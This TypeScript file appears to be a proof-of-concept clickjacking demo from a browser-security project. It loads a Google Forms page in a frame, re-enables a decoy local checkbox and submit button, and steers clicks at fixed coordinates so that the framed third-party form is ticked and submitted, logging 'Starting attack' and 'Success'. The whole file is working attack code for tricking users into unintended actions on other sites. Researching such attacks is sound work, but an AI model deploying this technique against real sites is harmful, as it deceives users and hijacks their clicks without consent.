import { Frame } from '../../src/frame/index.ts'
import { sleep } from '../../src/utils.ts'

const $ = (id: string) => document.getElementById(id)
const testForm = $('test-form') as HTMLFormElement
const termsLabel = $('terms-label') as HTMLLabelElement
const termsCheckbox = $('terms-checkbox') as HTMLInputElement
const submitButton = $('submit-button') as HTMLInputElement

testForm.addEventListener('submit', (event) => {
  event.preventDefault()
  testForm.reset()
})

async function main() {
  console.log('Starting attack')

  using frame = new Frame(1000, 1000)
  await frame.load('https://forms.gle/ZEBK8v684ARcuh1o9')
  console.log('Frame loaded')

  testForm.reset()

  termsCheckbox.disabled = false
  await frame.elementClick(termsLabel, { x: 215, y: 320 })
  console.log('Clicked option')

  submitButton.disabled = false
  await frame.elementClick(submitButton, { x: 226, y: 397 }, () => {
    testForm.reset()
    termsCheckbox.disabled = true
    submitButton.disabled = true
  })
  console.log('Clicked submit')

  await sleep(1000) // Wait for the form to submit

  console.log('Success')

  const iframe = frame.retriveFrame()
  iframe.style = 'width: 400px; height: 350px'
}

main()
